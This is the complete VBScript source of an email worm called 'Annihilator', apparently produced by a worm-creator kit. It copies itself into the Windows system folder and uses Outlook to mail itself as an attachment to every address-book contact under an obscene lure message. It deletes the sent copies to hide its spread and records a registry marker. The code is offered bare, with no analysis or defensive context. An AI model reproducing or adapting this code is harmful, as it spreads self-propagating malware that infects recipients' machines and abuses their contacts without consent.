'Worm Created whit [K]Alamar's Vbs Worms Creator 0.1
On Error Resume Next
Set ssmmzekyixk = CreateObject("WScript.Shell")
set aoeduoytpwb=createobject("scripting.filesystemobject")
aoeduoytpwb.copyfile wscript.scriptfullname,aoeduoytpwb.GetSpecialFolder(1)& "\Annihilator.vbs"
if ssmmzekyixk.regread ("HKCU\software\Annihilator\mailed") <> "1" then
sztroxwhzfh()
end if
Function sztroxwhzfh()
On Error Resume Next
Set gluufglwncj = CreateObject("Outlook.Application")
If gluufglwncj= "Outlook"Then
Set admrlbzzybt=gluufglwncj.GetNameSpace("MAPI")
For Each qtiwpxyawix In admrlbzzybt.AddressLists
If qtiwpxyawix.AddressEntries.Count <> 0 Then
For mecwvqlsxpp= 1 To qtiwpxyawix.AddressEntries.Count
Set ibpagoengiv = qtiwpxyawix.AddressEntries(mecwvqlsxpp)
Set polusepbeci = gluufglwncj.CreateItem(0)
polusepbeci.To = ibpagoengiv.Address
polusepbeci.Subject = "Here you have, ;o)"
polusepbeci.Body = "Hi your gooddamn mutherfucker!" & vbcrlf & "" & vbcrlf & "Check This and suck my dick!" & vbcrlf & ""
polusepbeci.Attachments.Add aoeduoytpwb.GetSpecialFolder(1)& "\Annihilator.vbs"
polusepbeci.DeleteAfterSubmit = True
If polusepbeci.To <> "" Then
polusepbeci.Send
End If
Next
End If
Next
ssmmzekyixk.regwrite "HKCU\software\Annihilator\mailed", "1"
end if
End Function
